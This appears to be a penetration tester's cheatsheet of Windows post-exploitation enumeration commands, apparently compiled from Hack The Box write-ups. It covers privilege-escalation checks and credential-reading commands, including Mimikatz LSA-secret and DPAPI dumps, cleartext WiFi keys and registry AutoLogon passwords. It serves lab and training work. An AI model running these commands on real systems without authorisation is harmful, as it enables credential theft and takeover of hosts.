---
title: "Windows Post-Exploitation Enumeration Cheatsheet"
type: cheatsheet
tags: [cheatsheet, enumeration, htb, post-exploitation, privilege-escalation, windows]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [git-htb-writeups]
---

# Windows Post-Exploitation Enumeration Cheatsheet

---

## System Information

```powershell
systeminfo
hostname
[System.Environment]::OSVersion
$env:PROCESSOR_ARCHITECTURE
wmic qfe list                       # patches / hotfixes
Get-HotFix
set; Get-ChildItem Env:             # environment variables
```

---

## Users and Groups

```powershell
whoami; whoami /all; whoami /priv   # privileges — key field
net user; Get-LocalUser
net user username                   # specific user detail
net localgroup; Get-LocalGroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"

# Domain (if domain-joined)
net user /domain
net group /domain
net group "Domain Admins" /domain
```

---

## Network

```powershell
ipconfig /all
route print
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
arp -a
ipconfig /displaydns
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all
net share                           # local shares
```

---

## Processes and Services

```powershell
tasklist /v; Get-Process
net start
sc query state= all
Get-Service | Where-Object {$_.Status -eq "Running"}
wmic service get name,displayname,pathname,startmode   # all services with paths

# Unquoted service paths (privesc vector)
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows\\"

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
```

---

## Installed Software

```powershell
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
```

---

## File System — Interesting Files

```powershell
# Search for config files
dir /s /b C:\*.txt 2>nul
dir /s /b C:\*.ini 2>nul
dir /s /b C:\*.config 2>nul
dir /s /b C:\*.bak 2>nul
dir /s /b C:\*.xml 2>nul

# Search for passwords in files
findstr /si "password" *.txt *.ini *.config *.xml
findstr /spin "password" *.*

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadLineOption).HistorySavePath

# SAM/SYSTEM backup copies
dir C:\Windows\System32\config\RegBack\
dir C:\Windows\repair\
dir C:\Windows\System32\config\SAM
```

---

## Registry — Credential Sources

```powershell
# AutoLogon credentials (cleartext password)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# VNC password
reg query "HKCU\Software\ORL\WinVNC3\Password"

# AlwaysInstallElevated (both must be 1 for privesc)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored Windows credentials
cmdkey /list
```

---

## Privilege Escalation Quick Checks

```powershell
# 1. Token privileges
whoami /priv
# SeImpersonatePrivilege → Potato attacks
# SeBackupPrivilege → dump SAM/NTDS.dit
# SeDebugPrivilege → dump LSASS

# 2. Stored credentials
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# 3. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 4. Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# 5. Weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# 6. DLL hijacking — check service binary path and PATH directories
echo %PATH%
```

---

## Automated Tools

```powershell
# WinPEAS — comprehensive
.\winPEASx64.exe

# PowerUp — service/config checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — security posture
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe audit

# PrivescCheck — extended with report
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

---

## Credential Harvesting

```powershell
# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# DPAPI — Mimikatz
mimikatz# dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*

# LSA secrets (admin)
mimikatz# lsadump::secrets
```

## See Also

- [[windows-privesc]] cheatsheet — exploitation of above vectors
- [[pass-the-hash]] — credential reuse
- [[ad-cheatsheet|Active Directory cheatsheet]] — domain enumeration
